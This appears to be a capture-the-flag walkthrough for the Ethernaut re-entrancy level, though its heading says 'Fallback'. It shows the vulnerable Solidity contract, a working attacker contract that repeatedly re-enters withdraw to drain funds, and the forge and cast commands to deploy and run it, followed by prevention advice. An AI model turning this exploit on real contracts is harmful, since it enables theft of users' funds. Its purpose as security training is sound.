## Fallback Level Outline

**Difficulty : 6/10**

The goal of this level is for you to steal all the funds from the contract.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D)

## Solution
Re-entrancy attacks continiously call the withdraw function from a vulnerable contract till it is drained. This happens because ETH is sent out of the contract before the ETH is deducted from it's mapping/tracking variable.

### Walkthrough

1. create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    Reentrance reentrance;  
    uint256 amount = 0.001 ether;

    constructor(address _reentrance) {
        reentrance = Reentrance(_reentrance); 
    }

    receive() external payable {
        if (address(reentrance).balance >= 0) {
            reentrance.withdraw(amount);
        }
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(amount);
    }
}

interface Reentrance {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}
```

2. deploy our new contract
```console
forge create src/Contract.sol:Attack --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

3. call the "attack()" function on our newly deployed contract 
```console
cast send $DEPLOYED_ADDRESS "attack()" --value 0.01ether --gas 200000 --private-key $PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

## Further Reading
[Video](https://www.youtube.com/watch?v=4Mm3BCyHtDY&t=321s) showing example of Re-entrancy attack 

To prevent re-entrancy attacks, use the [Check-Effects-Interactions pattern](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) or use OpenZepplin's [Reentrancy Guard Contract](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard)

